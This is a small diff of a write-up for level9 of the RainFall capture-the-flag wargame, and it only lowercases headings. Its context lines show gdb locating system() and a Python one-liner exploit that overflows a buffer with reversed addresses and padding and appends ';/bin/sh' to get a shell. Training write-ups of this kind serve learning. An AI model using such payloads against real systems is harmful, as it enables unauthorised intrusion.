@@ -1,6 +1,6 @@
-# Level9
+# level9
 
-## Exploring the binary
+## exploring the binary
 ```shell
 level9@RainFall:~$ ./level9
 level9@RainFall:~$ ./level9 phantom
@@ -158,7 +158,7 @@ $1 = (<text variable, no debug info> *) 0xb7d86060 <system>
 
 ```
 
-## Exploit
+## exploit
 ``` shell
 level9@RainFall:~$ ./level9 $(python -c 'print "\xb7\xd8\x60\x60"[::-1] + "F" * 104 + "\x08\x04\xa0\x0c"[::-1] + ";/bin/sh"')
 sh: 1:
